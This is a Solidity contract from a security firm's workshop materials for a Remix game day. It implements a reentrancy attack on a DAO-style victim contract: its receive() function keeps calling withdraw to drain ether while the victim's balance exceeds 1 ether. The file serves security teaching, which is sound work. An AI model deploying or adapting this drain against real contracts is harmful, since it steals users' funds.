// SPDX-License-Identifier: GPL-3.0
/**  Do NOT use this code in production **
    _    _           _ _             
   | |  | |         (_) |            
   | |  | |___  ____ _| | ___   ____ 
    \ \/ / _  )/ ___) | |/ _ \ / _  |
     \  ( (/ /| |   | | | |_| ( ( | |
    _ \/ \____)_|   |_|_|\___/ \_|| |
   | |        | |      _      (_____|
    \ \   ___ | |_   _| |_ (_) ___  ____   ___ 
     \ \ / _ \| | | | |  _)| |/ _ \|  _ \ /___)
 _____) ) |_| | | |_| | |__| | |_| | | | |___ |
(______/ \___/|_|\____|\___)_|\___/|_| |_(___/ 
                                               
Verilog Solutions Inc. https://www.verilog.solutions
Verilog is a full-stack web3 security firm, covering smart contract auditing, 
validator operations, venture investment, and incubation.
Glad to prepare and present the materials for Game Day Remix in DevConnect Amsterdam!
*/

pragma solidity ^0.8.4;
import "./interface/IDAOVictim.sol";
import "hardhat/console.sol";

contract DAOAttacker {
    IDAOVictim public victim;

    constructor(IDAOVictim victim_address) {
        victim = victim_address;
    }

    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw(address(this));
    }

    receive() external payable {
        // may be a better expression in if statement,
        // this version may lead to REVERT;
        console.log(
            "Attacker:: >>> Taking over control from address(victim): ",
            address(victim)
        );
        console.log("Attacker:: Victim Balance: ", address(victim).balance);
        if (address(victim).balance > 1 ether) {
            console.log(
                "Attacker:: Balance > 1e ther, Reentering >>> ",
                address(victim)
            );
            victim.withdraw(address(this));
        }
    }
}
